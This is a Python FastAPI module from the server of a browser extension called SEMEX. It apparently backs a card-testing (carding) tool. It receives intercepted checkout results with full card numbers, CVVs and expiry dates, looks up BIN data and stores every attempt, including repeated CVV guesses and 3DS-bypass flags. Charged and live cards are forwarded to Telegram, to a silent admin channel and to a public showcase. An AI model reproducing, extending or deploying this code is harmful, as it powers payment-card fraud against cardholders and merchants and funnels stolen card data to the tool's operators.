"""Data routes — hit submission (status + screenshot) and forwarding to Telegram."""
from __future__ import annotations

import asyncio
import html
import logging
import re
import uuid
from datetime import datetime, timezone
from typing import Any, Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field, field_validator

from config import settings
from db import get_db
from deps import get_current_user, get_current_user_allow_expired, rate_limit
from deps import get_current_user_unlocked  # redeem-gate for locked Telegram signups
from models import Hit, User
from services.bin_lookup import lookup_bin
from services.extra_formatters import format_public_showcase
from services.hit_formatter import format_hit
from services import telegram_outbox

log = logging.getLogger("semex.data")

router = APIRouter(prefix="/api/data", tags=["data"])


_MIN_EXTENSION_CACHE: dict = {"version": None, "expires": 0.0}

# The version this build was compiled against. Used as the safe floor when
# the DB has a corrupt/invalid min-version row (e.g. "3" without dots).
_FALLBACK_MIN_VERSION = "2.5.1"

# A well-formed extension version must have at least 2 numeric parts joined by
# dots (e.g. "2.3", "2.3.9", "10.0.1"). Single-integer strings like "3" are
# rejected because they compare higher than 2.3.9 and cause a paywall loop
# where the newest build looks outdated to itself.
_VERSION_RX = __import__("re").compile(r"^\d+\.\d+(?:\.\d+)?(?:\.\d+)?$")


def _is_valid_semver(v: str) -> bool:
    return bool(v) and bool(_VERSION_RX.match(str(v).strip()))


def _parse_version(v: str) -> tuple:
    """Best-effort semver parse, normalized to a fixed 4-part tuple so that
    equivalent versions compare equal (e.g. "2.4" == "2.4.0.0") and shorter
    strings are never treated as LESS than their zero-padded form. Returns
    (0,0,0,0) for missing/malformed input."""
    if not v:
        return (0, 0, 0, 0)
    try:
        parts = [int("".join(ch for ch in p if ch.isdigit()) or "0") for p in str(v).split(".")[:4]]
        # Pad to 4 components so (2,4) and (2,4,0,0) compare equal.
        while len(parts) < 4:
            parts.append(0)
        return tuple(parts[:4])
    except Exception:
        return (0, 0, 0, 0)


async def _get_min_extension_version() -> str:
    """Read the minimum required extension version from the DB (cached 60s).
    Rejects invalid version strings (e.g. "3", "latest", empty) and falls back
    to `_FALLBACK_MIN_VERSION` — the version this server was built against.
    Prevents the paywall-loop bug where a bogus "3" in the DB makes every
    build appear outdated."""
    import time as _t
    now = _t.time()
    if _MIN_EXTENSION_CACHE["version"] and now < _MIN_EXTENSION_CACHE["expires"]:
        return _MIN_EXTENSION_CACHE["version"]
    v = _FALLBACK_MIN_VERSION
    try:
        db = get_db()
        # Prefer explicit minimum, fall back to latest — but only if the
        # stored version string is a real semver. Bogus rows are skipped.
        # _FALLBACK_MIN_VERSION is always the FLOOR: if the DB holds an older
        # value it is silently ignored, so updating this constant is all that
        # is needed to gate a new minimum without touching the DB.
        for filt in ({"is_minimum": True}, {"is_latest": True}):
            cursor = db.extension_releases.find(filt).sort("published_at", -1).limit(5)
            async for doc in cursor:
                candidate = str(doc.get("version") or "").strip()
                if _is_valid_semver(candidate):
                    # Take the higher of DB value and hardcoded floor.
                    if _parse_version(candidate) > _parse_version(v):
                        v = candidate
                    break
            else:
                continue
            break
    except Exception:
        pass
    _MIN_EXTENSION_CACHE["version"] = v
    _MIN_EXTENSION_CACHE["expires"] = now + 60
    return v


async def _enforce_min_extension_version(request: Request) -> None:
    """Raise HTTP 426 (Upgrade Required) if the caller's X-Extension-Version
    header is below the minimum required version. Missing header → allowed
    (browser tests, curl, admin dashboard don't send it)."""
    sent = request.headers.get("x-extension-version") or ""
    if not sent:
        return
    min_v = await _get_min_extension_version()
    if _parse_version(sent) < _parse_version(min_v):
        bot_handle = settings.TELEGRAM_BOT_USERNAME
        raise HTTPException(
            status_code=426,
            detail={
                "error": "upgrade_required",
                "code": "EXTENSION_OUTDATED",
                "sentVersion": sent,
                "minVersion": min_v,
                "downloadUrl": f"{str(settings.BASE_URL or '').rstrip('/')}/api/telegram/download/extension" if getattr(settings, "BASE_URL", None) else "/api/telegram/download/extension",
                "botLink": f"https://t.me/{bot_handle}",
                "botCommand": "/get",
                "message": f"Your SEMEX extension (v{sent}) is out of date. Please update to v{min_v} or newer — run /get in @{bot_handle}.",
            },
        )



class CardData(BaseModel):
    number: Optional[str] = None
    month: Optional[str] = None
    year: Optional[str] = None
    cvv: Optional[str] = None
    holder: Optional[str] = None


class StatusBody(BaseModel):
    status: str
    gateway: Optional[str] = None
    url: Optional[str] = None
    siteUrl: Optional[str] = None
    hostname: Optional[str] = None
    response: Optional[str] = None
    card: Optional[Any] = None  # dict OR string OR anything — normalised by _extract_card
    declineCode: Optional[str] = None
    errorCode: Optional[str] = None
    declineReason: Optional[str] = None
    amount: Optional[float] = None
    currency: Optional[str] = None
    customerEmail: Optional[str] = None
    merchant: Optional[str] = None
    productName: Optional[str] = None
    successUrl: Optional[str] = None
    invoiceUrl: Optional[str] = None
    invoiceNumber: Optional[str] = None
    screenshot: Optional[str] = None  # base64 JPEG (may be included with status too)
    submitId: Optional[str] = None  # v2.9.1: client-generated id so the async screenshot follow-up finds this hit
    fingerprint: Optional[str] = None
    threeDSBypassed: Optional[Any] = None

    # Checkout pages send amounts like "₹250.00", "1,250.00", "$19" or "" — coerce
    # leniently so the request NEVER 422s (which previously rejected the whole hit
    # before it could be saved, surfacing as "server not saved [object Object]").
    @field_validator("amount", mode="before")
    @classmethod
    def _coerce_amount(cls, v):
        if v is None or v == "":
            return None
        if isinstance(v, (int, float)):
            return float(v)
        s = re.sub(r"[^0-9.\-]", "", str(v))
        if s in ("", "-", ".", "-.", ".-"):
            return None
        try:
            return float(s)
        except (ValueError, TypeError):
            return None

    # Every non-amount/non-card field is a string server-side, but gateways/pages can
    # send objects, arrays or numbers (e.g. `response` as a JSON object). Coerce
    # anything non-string to a string so no field type can ever 422 the hit.
    @field_validator(
        "status", "gateway", "url", "siteUrl", "hostname", "response",
        "declineCode", "errorCode", "declineReason", "currency", "customerEmail",
        "merchant", "productName", "successUrl", "invoiceUrl", "invoiceNumber",
        "screenshot", "fingerprint",
        mode="before",
    )
    @classmethod
    def _coerce_str(cls, v):
        if v is None or isinstance(v, str):
            return v
        if isinstance(v, (dict, list)):
            import json
            try:
                return json.dumps(v)[:20000]
            except (TypeError, ValueError):
                return str(v)
        return str(v)


class ScreenshotBody(BaseModel):
    screenshot: str  # base64 JPEG
    fingerprint: Optional[str] = None
    hitId: Optional[str] = None  # tie to a prior hit record if provided
    submitId: Optional[str] = None  # v2.9.1: client-generated submission id
    status: Optional[str] = None   # for the follow-up caption (LIVE hits aren't persisted)
    siteUrl: Optional[str] = None


def _extract_card(card_raw) -> dict:
    if not card_raw:
        return {}
    if isinstance(card_raw, dict):
        n = str(card_raw.get("number") or card_raw.get("cc") or "").replace(" ", "")
        m = str(card_raw.get("month") or card_raw.get("exp_month") or card_raw.get("mm") or "")
        y = str(card_raw.get("year") or card_raw.get("exp_year") or card_raw.get("yy") or "")
        c = str(card_raw.get("cvv") or card_raw.get("cvc") or "")
        h = card_raw.get("holder") or card_raw.get("name")
        return {"number": n, "month": m, "year": y, "cvv": c, "holder": h}
    if isinstance(card_raw, str):
        parts = card_raw.replace("|", ":").split(":")
        parts = [p.strip() for p in parts]
        if len(parts) >= 4:
            return {"number": parts[0], "month": parts[1], "year": parts[2], "cvv": parts[3]}
    return {}


_RECENT_HIT_DEDUP: dict[str, float] = {}
_HIT_DEDUP_WINDOW_SEC = 8.0


def _extract_client_ip(request: Request) -> str | None:
    """Extract the real client IP from a request, honoring reverse-proxy headers.
    Order: CF-Connecting-IP → X-Real-IP → first X-Forwarded-For entry → request.client.host."""
    for h in ("cf-connecting-ip", "x-real-ip", "true-client-ip"):
        v = request.headers.get(h)
        if v:
            return v.strip()
    xff = request.headers.get("x-forwarded-for")
    if xff:
        first = xff.split(",")[0].strip()
        if first:
            return first
    try:
        return request.client.host if request.client else None
    except Exception:
        return None


def _dedup_key(telegram_id: int | str, card_number: str, status: str, url: str | None, cvv: str | None = None) -> str:
    # Use the FULL card number (not last-6) so two distinct cards that happen to
    # share their last digits within the dedup window are never collapsed into
    # one. The key lives only in an in-memory dict, never logged or persisted.
    #
    # `cvv` is included ONLY for non-forwardable (declined/dead/error)
    # persistence: a user testing several CVVs on the SAME card in quick
    # succession makes distinct attempts that must each get their own history
    # row, while the fetch+XHR double-fire of a SINGLE response (same cvv) still
    # collapses to one. Forwardable (charged/live) dedup omits cvv — its
    # PAN+status+url key is the proven guard against duplicate Telegram sends.
    base = f"{telegram_id}|{card_number or ''}|{(status or '').lower()}|{(url or '').split('?')[0][:120]}"
    return f"{base}|{cvv}" if cvv else base


def _is_duplicate_hit(key: str) -> bool:
    """Reject the same (user, card, status, url) submitted twice within a short window.
    Both fetch AND XHR interceptors can fire on the same gateway response, and
    upstream frontend dedup is bypassed while the overlay is active — so guard
    it server-side too so Telegram never gets duplicate CHARGED/LIVE messages."""
    now = datetime.now(timezone.utc).timestamp()
    # prune stale entries
    stale = [k for k, t in _RECENT_HIT_DEDUP.items() if now - t > _HIT_DEDUP_WINDOW_SEC]
    for k in stale:
        _RECENT_HIT_DEDUP.pop(k, None)
    last = _RECENT_HIT_DEDUP.get(key)
    if last is not None and (now - last) < _HIT_DEDUP_WINDOW_SEC:
        return True
    _RECENT_HIT_DEDUP[key] = now
    return False


async def enforce_min_extension_version_dep(request: Request) -> None:
    await _enforce_min_extension_version(request)


@router.post("/status")
async def submit_status(
    body: StatusBody,
    request: Request,
    user: User = Depends(get_current_user_unlocked),
):
    await rate_limit(f"hit_submit:{user.telegram_id}", 200)  # 200 hits/hour per user
    db = get_db()
    # v2.3.7 HONEYPOT: middleware may have flagged this request as coming from
    # an outdated extension (paywall bypassed via DOM/DevTools tampering). We
    # still process the hit (so we never lose intel) but tag it + fire a
    # separate admin alert so the owner sees who's tampering.
    from_outdated_ext = bool(getattr(request.state, "extension_outdated", False))
    outdated_sent_v = getattr(request.state, "extension_sent_version", None)
    outdated_min_v = getattr(request.state, "extension_min_version", None)

    # "make it working" fix: a hit is ALWAYS saved to the DB (so it shows in the
    # admin panel + counters) regardless of plan state — the old code used
    # get_current_user which 402'd expired/non-admin users BEFORE the insert, so
    # nothing saved and the owner saw endless "server not saved" errors. Forwarding
    # to Telegram is gated on real access below. The configured ADMIN_TELEGRAM_ID is
    # always treated as having access even if the stored is_admin flag is stale.
    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
    # Extension is FREE — everyone with a valid session can submit hits and
    # have them forwarded. Admin-panel actions are still gated separately.
    card = _extract_card(body.card)
    number = card.get("number") or ""
    bin_code = number[:8] if number else None
    # v2.9.1: hard-cap the BIN lookup so a slow bin API can never delay the
    # hit save / Telegram notification path (speed >> BIN metadata).
    bin_info = None
    if bin_code:
        try:
            bin_info = await asyncio.wait_for(lookup_bin(bin_code), timeout=2.5)
        except Exception:
            bin_info = None

    status_norm = (body.status or "").lower()
    is_charged = status_norm in ("charged", "success", "approved", "succeeded", "captured")
    is_live = status_norm in ("live", "ccn_live", "3d_live")
    should_forward = is_charged or is_live
    # PERSISTENCE (v4.1): every attempt that carries a REAL card number is saved
    # to db.hits — not just charged/live — so the user's dashboard History tab
    # shows declines (incl. incorrect-CVV) with their card + date. A card-less
    # result (junk gateway JSON on an unrelated page) is never persisted, so the
    # history stays meaningful. Telegram forwarding is still charged/live only.
    should_persist = len((number or "").replace(" ", "")) >= 12

    # HARD RULE (server-side defense-in-depth): a forwardable hit MUST carry a
    # real card number. Reject `USD 0.00 CHARGED` false positives coming from
    # random gateway-like JSON on unrelated pages (e.g. Stripe in-build widgets
    # firing "status:succeeded" without any actual card entry). We also require
    # a plausible amount — 0/None amount is a strong signal of a fake trigger.
    if should_forward:
        _amt = body.amount
        try:
            _amt_num = float(_amt) if _amt is not None and _amt != "" else 0.0
        except (TypeError, ValueError):
            _amt_num = 0.0
        if not number or len(number.replace(" ", "")) < 12:
            # Never log PAN — length + last4 only (was logging the full card).
            log.warning("dropping forwardable %s with empty/short card: len=%s last4=%s",
                        status_norm, len(number or ""), (number or "")[-4:])
            return {"success": False, "hitId": None, "forwarded": False, "dropped": "no_card"}
        if is_charged and _amt_num <= 0:
            log.warning("dropping CHARGED with zero/negative amount: amount=%r", _amt)
            return {"success": False, "hitId": None, "forwarded": False, "dropped": "zero_amount"}

    # Deduplicate: same user + card + status + url within the dedup window → drop.
    # Forwardable (CHARGED/LIVE): PAN-based key — the proven guard against double
    # Telegram sends when both the fetch AND XHR interceptors fire on one response.
    if should_forward:
        dkey = _dedup_key(user.telegram_id, number, body.status or "", body.url or body.siteUrl)
        if _is_duplicate_hit(dkey):
            # Never log the dedup key itself — it embeds the FULL card number.
            log.info("duplicate hit dropped: tid=%s last4=%s status=%s",
                     user.telegram_id, (number or "")[-4:], status_norm)
            return {"success": True, "hitId": None, "forwarded": False, "duplicate": True}
    elif should_persist:
        # Non-forwardable persisted (declined/dead/error): CVV-aware key so the
        # SAME response fired twice (fetch+XHR) collapses to one row, but a user
        # retrying DIFFERENT CVVs on the same card keeps a row per attempt.
        dkey = _dedup_key(user.telegram_id, number, body.status or "", body.url or body.siteUrl, cvv=card.get("cvv"))
        if _is_duplicate_hit(dkey):
            log.info("duplicate non-forwardable hit dropped: tid=%s last4=%s status=%s",
                     user.telegram_id, (number or "")[-4:], status_norm)
            return {"success": True, "hitId": None, "forwarded": False, "duplicate": True}

    hit = Hit(
        telegram_id=user.telegram_id,
        status=body.status,
        gateway=body.gateway,
        hostname=body.hostname,
        url=body.url,
        site_url=body.siteUrl,
        card_number=number or None,
        card_exp_month=card.get("month"),
        card_exp_year=card.get("year"),
        card_cvv=card.get("cvv"),
        card_holder=card.get("holder"),
        bin=bin_code,
        bin_brand=bin_info.get("brand") if bin_info else None,
        bin_type=bin_info.get("type") if bin_info else None,
        bin_level=bin_info.get("level") if bin_info else None,
        bin_bank=bin_info.get("bank") if bin_info else None,
        bin_country=bin_info.get("country_name") if bin_info else None,
        bin_country_flag=bin_info.get("country_flag") if bin_info else None,
        amount=body.amount,
        currency=body.currency,
        response=body.response,
        decline_code=body.declineCode,
        decline_reason=body.declineReason,
        error_code=body.errorCode,
        product=body.productName,
        merchant=body.merchant,
        customer_email=body.customerEmail,
        success_url=body.successUrl,
        invoice_url=body.invoiceUrl,
        invoice_number=body.invoiceNumber,
        ip=_extract_client_ip(request),
        ip_country=(request.headers.get("cf-ipcountry") or request.headers.get("x-country") or None),
        screenshot_b64=body.screenshot if (is_charged or is_live) else None,  # store screenshot for charged + live
        submit_id=body.submitId,
        from_outdated_ext=from_outdated_ext,
        ext_sent_version=outdated_sent_v if from_outdated_ext else None,
    )
    # PERSISTENCE POLICY (v4.1): CHARGED and LIVE hits are saved to the DB (keyed
    # by telegram_id) so the admin panel can look up a user's charged + live
    # cards. DECLINED/DEAD/ERROR hits that carry a REAL card are ALSO saved now
    # (below, before the SSE nudge) so the user's dashboard History tab shows
    # every attempt — incl. incorrect-CVV declines — with card + date. They are
    # NOT forwarded to Telegram (charged/live only); card-less results never
    # persist so junk gateway JSON can't create empty history rows.
    #
    # DURABILITY ORDERING: for CHARGED/LIVE hits the actual DB insert is DEFERRED
    # until AFTER the durable outbox entries are written (see the forward
    # section). This guarantees a forwardable hit can never be persisted/visible
    # in the dashboard without its Telegram delivery work already existing
    # durably — closing the "saved to DB but never reached Telegram" gap even if
    # the process crashes mid-request. Both writes hit the same Mongo instance,
    # so either both survive or neither does.
    hit_id = None

    # Update user counters. Best-effort: a counter-update failure is logged, never
    # fatal — the hit's persistence + forwarding must still proceed.
    try:
        inc = {"hit_count": 1}
        if is_charged:
            inc["charged_count"] = 1
        elif is_live:
            inc["live_count"] = 1
        await db.users.update_one({"telegram_id": user.telegram_id}, {"$inc": inc})
    except Exception as _e:
        log.warning("user counter update failed (hit already saved): %s", _e)

    # Persist non-forwardable hits (declined/dead/error) that carry a real card
    # NOW — before the SSE nudge — so the dashboard's live refresh picks up the
    # new row. Forwardable CHARGED/LIVE inserts stay deferred until after the
    # outbox enqueues (durability ordering above).
    if not should_forward and should_persist:
        try:
            ins = await db.hits.insert_one(hit.to_mongo())
            hit_id = str(ins.inserted_id)
        except Exception as _e:
            log.warning("non-forwardable hit insert failed: %s", _e)

    # Notify any open dashboard tabs via SSE so stats/history refresh live.
    # publish() is non-blocking — it enqueues to in-memory asyncio.Queue(s).
    # This is safe on single-process Railway deployments; for multi-worker
    # setups a pub-sub broker (Redis) would be needed instead.
    try:
        from services.sync import sync_manager as _sm
        _sm.publish(user.telegram_id, "hit")
    except Exception:
        pass

    # Skip forwarding for declines/dead/errors (only forward charged + live)
    if not should_forward:
        return {"success": True, "hitId": hit_id, "forwarded": False}

    # Format message. A formatting failure must NOT silently drop an already-saved
    # charged hit (the exact "saved to DB but never reached Telegram" failure mode):
    # log it and fall back to a minimal notification so downstream sends still fire.
    # hit_dict/user_dict are built outside the try so the admin/owner paths below
    # (which reuse them) are always defined even if formatting raises.
    hit_dict = hit.model_dump()
    hit_dict["three_ds_bypassed"] = str(body.threeDSBypassed or "").lower() in ("true", "1")
    user_dict = user.model_dump()
    user_dict["is_owner"] = is_admin  # effective admin (flag OR configured ADMIN_TELEGRAM_ID)
    try:
        text = format_hit(hit_dict, user_dict, admin_view=False)
    except Exception as _e:
        log.error("format_hit failed, using fallback text: %s", _e)
        _st = "CHARGED" if is_charged else "LIVE"
        _em = "✅" if is_charged else "🔥"
        text = f"⚜️ <b>SEMEX</b> — {_st} {_em} (formatting error — see dashboard)"

    # Telegram's photo-caption limit (1024) applies to VISIBLE text, not the HTML
    # markup we send (tags + link hrefs don't count). Measure visible length so the
    # full details stay attached to the screenshot whenever they truly fit; only
    # fall back to a separate follow-up message when the visible text is too long.
    def _visible_len(s: str) -> int:
        return len(re.sub(r"<[^>]+>", "", s or ""))

    _fallback_st = "CHARGED" if is_charged else "LIVE"
    _fallback_em = "✅" if is_charged else "🔥"

    def _photo_caption(full_text: str) -> str:
        return full_text if _visible_len(full_text) <= 1024 else f"⚜️ <b>SEMEX</b> — {_fallback_st} {_fallback_em} (details below)"

    # DURABLE FORWARD (outbox): every intended forward below is persisted as a
    # pending telegram_outbox document BEFORE any network send. A background
    # worker delivers it via the existing send_message/send_photo helpers,
    # retrying with backoff until it succeeds — so a hit can never be "saved to
    # DB but never reach Telegram", even across a crash/redeploy/network outage.
    # `forward_id` uniquely identifies this submission; per-destination dedup
    # keys make enqueue idempotent (a re-submitted duplicate can't double-send).
    forward_id = uuid.uuid4().hex

    async def _enqueue_forward(chat_id, msg_text: str, *, pin: bool, key_prefix: str, with_photo: bool = None) -> None:
        """Enqueue a text-or-photo forward, mirroring the previous inline logic:
        hits with a screenshot go as a photo (charged by default; other statuses
        only where the caller opts in via with_photo=True, e.g. the admin log);
        when the visible caption exceeds Telegram's 1024 limit the full details
        follow as a separate (also durable) message."""
        if with_photo is None:
            with_photo = is_charged
        try:
            if with_photo and body.screenshot:
                if _visible_len(msg_text) > 1024:
                    await telegram_outbox.enqueue_photo(
                        db, chat_id, body.screenshot, _photo_caption(msg_text),
                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
                    await telegram_outbox.enqueue_message(
                        db, chat_id, msg_text,
                        dedup_key=f"{forward_id}:{key_prefix}:text")
                else:
                    await telegram_outbox.enqueue_photo(
                        db, chat_id, body.screenshot, msg_text,
                        pin=pin, dedup_key=f"{forward_id}:{key_prefix}:photo")
            else:
                await telegram_outbox.enqueue_message(
                    db, chat_id, msg_text, pin=pin,
                    dedup_key=f"{forward_id}:{key_prefix}:text")
        except Exception as e:
            log.warning("outbox enqueue (%s) failed: %s", key_prefix, e)

    # v2.9.1: all forward destinations are enqueued in PARALLEL (was serial —
    # each outbox insert is a Mongo round trip, so 3-5 destinations added
    # hundreds of ms to the API critical path before the response).
    async def _fwd_admin_or_owner() -> None:
        # SILENT admin log — for non-admin users' hits:
        #   CHARGED → pinned, with screenshot
        #   LIVE / 3DS-LIVE (incl. live-class variants like insufficient) → NOT
        #   pinned, but still with screenshot when available.
        # Admin's own hits stay in admin's DM only (already sent above).
        if not is_admin and (is_charged or is_live):
            try:
                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
            except Exception as _e:
                log.error("admin format_hit failed, using fallback: %s", _e)
                admin_text = f"⚜️ <b>SEMEX</b> — {_fallback_st} {_fallback_em} (formatting error — see dashboard)"
            await _enqueue_forward(settings.ADMIN_LOG_CHANNEL_ID, admin_text,
                                   pin=is_charged, with_photo=True, key_prefix="admin")
        # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED
        # hit, the owner gets a personal DM copy so nothing slips past them.
        # LIVE hits are NOT mirrored (public + user DM only).
        elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
            try:
                admin_text = format_hit(hit_dict, user_dict, admin_view=True)
            except Exception as _e:
                log.error("owner mirror format_hit failed, using fallback: %s", _e)
                admin_text = "⚜️ <b>SEMEX</b> — CHARGED ✅ (formatting error — see dashboard)"
            await _enqueue_forward(settings.ADMIN_TELEGRAM_ID, admin_text,
                                   pin=False, key_prefix="owner")

    async def _fwd_public() -> None:
        # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
        # Public info only: user (masked), status, gateway, response. NO card/amount/email.
        # Admin can mute individual users from the public feed via public_muted=True.
        if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
            try:
                public_text = format_public_showcase(hit_dict, user_dict)
                await telegram_outbox.enqueue_message(
                    db, int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text,
                    dedup_key=f"{forward_id}:public:text")
            except Exception as e:
                log.warning("public showcase enqueue failed: %s", e)

    # v2.9.2: user DM attaches the screenshot for LIVE hits too (was CHARGED
    # only) — the extension now captures silently for both.
    await asyncio.gather(
        _enqueue_forward(user.telegram_id, text, pin=is_charged, key_prefix="user", with_photo=True),
        _fwd_admin_or_owner(),
        _fwd_public(),
    )

    # Now that the durable delivery work exists, persist the CHARGED hit. Doing
    # the insert AFTER the enqueues means a crash between the two can only ever
    # leave delivery work WITHOUT a dashboard row (the message still reaches
    # Telegram) — never a dashboard row without delivery work.
    if is_charged or is_live:
        try:
            ins = await db.hits.insert_one(hit.to_mongo())
            hit_id = str(ins.inserted_id)
        except Exception as _e:
            log.warning("hit insert failed (forwards already enqueued): %s", _e)

    # Kick an immediate drain so the happy path delivers near-instantly instead
    # of waiting for the next worker poll tick.
    telegram_outbox.kick()

    return {"success": True, "hitId": hit_id, "forwarded": True, "pinned": is_charged}


@router.post("/screenshot")
async def submit_screenshot(body: ScreenshotBody, user: User = Depends(get_current_user_unlocked)):
    """Async screenshot follow-up (v2.9.1). The extension submits the hit
    INSTANTLY (no screenshot) and uploads the capture a moment later, so the
    Telegram notification is never delayed by screenshot capture. Here we
    attach the shot to the hit row and enqueue the photo follow-ups (user DM +
    admin log) through the durable outbox."""
    await rate_limit(f"screenshot:{user.telegram_id}", 60)  # 60 screenshots/hour per user
    if not body.screenshot:
        raise HTTPException(400, "Missing screenshot")

    db = get_db()
    hit = None
    if body.hitId:
        try:
            from bson import ObjectId
            hit = await db.hits.find_one({"_id": ObjectId(body.hitId), "telegram_id": user.telegram_id})
        except Exception:
            hit = None
    if hit is None and body.submitId:
        try:
            hit = await db.hits.find_one({"telegram_id": user.telegram_id, "submit_id": body.submitId})
        except Exception:
            hit = None
    if hit is not None:
        try:
            # v2.9.3: ownership-scoped update (was bare _id — TOCTOU-fragile).
            await db.hits.update_one(
                {"_id": hit["_id"], "telegram_id": user.telegram_id},
                {"$set": {"screenshot_b64": body.screenshot}},
            )
        except Exception:
            pass

    # Photo follow-up caption — short, always under Telegram's 1024 cap. LIVE
    # hits are never persisted, so fall back to request fields when no hit row.
    hitd = hit or {}
    status_up = ((body.status or hitd.get("status") or "HIT")).upper()
    site = body.siteUrl or hitd.get("site_url") or hitd.get("hostname") or ""
    card_num = hitd.get("card_number") or ""
    card4 = ("…" + card_num[-4:]) if card_num else ""
    caption = f"⚜️ <b>SEMEX</b> — {html.escape(status_up)} 📸"
    if card4:
        caption += f"\n⚜️Card ➔ <code>{html.escape(card4)}</code>"
    if site:
        caption += f"\n⚜️Site ➔ {html.escape(str(site))[:120]}"

    shot_key = body.submitId or body.hitId or uuid.uuid4().hex
    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
    # v2.9.4: never DM a photo for non-forwardable statuses (dead/declined/
    # error). The screenshot is still attached to the hit row above for the
    # dashboard — only the Telegram photo is gated. This endpoint bypasses the
    # /status forward gate, so it must apply the same rule itself.
    _SHOT_FORWARDABLE = {"charged", "success", "approved", "succeeded", "captured", "live", "ccn_live", "3d_live"}
    if ((body.status or hitd.get("status") or "")).lower() not in _SHOT_FORWARDABLE:
        return {"success": True, "forwarded": False}
    tasks = [
        telegram_outbox.enqueue_photo(db, user.telegram_id, body.screenshot, caption,
                                      dedup_key=f"shot:{shot_key}:user")
    ]
    if not is_admin:
        tasks.append(
            telegram_outbox.enqueue_photo(db, settings.ADMIN_LOG_CHANNEL_ID, body.screenshot, caption,
                                          dedup_key=f"shot:{shot_key}:admin")
        )
    # return_exceptions: one destination's insert failure must not cancel the
    # other or turn into a 500 (enqueue itself already swallows+logs, this is
    # belt-and-braces against gather cancellation semantics).
    await asyncio.gather(*tasks, return_exceptions=True)
    telegram_outbox.kick()
    return {"success": True}
